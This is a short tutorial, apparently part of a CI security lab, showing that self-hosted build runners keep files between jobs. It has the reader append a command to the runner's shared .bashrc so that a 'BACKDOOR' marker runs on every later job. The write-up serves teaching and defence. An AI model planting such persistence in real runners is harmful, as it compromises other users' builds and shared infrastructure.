Self-hosted runners keep their filesystem between jobs. Files dropped
by one build persist and are visible to the next build.

Check the runner workspace:

```bash
ls -la /runner/workspace/
cat /runner/workspace/.bashrc
```

The runner sources `.bashrc` before each job. A malicious build can
append commands to this file that execute on ALL future builds.

Try it:

```bash
echo 'echo "BACKDOOR: $(date)" >> /tmp/runner-compromised' >> /runner/workspace/.bashrc
```

The next time any job runs on this runner, the backdoor fires.
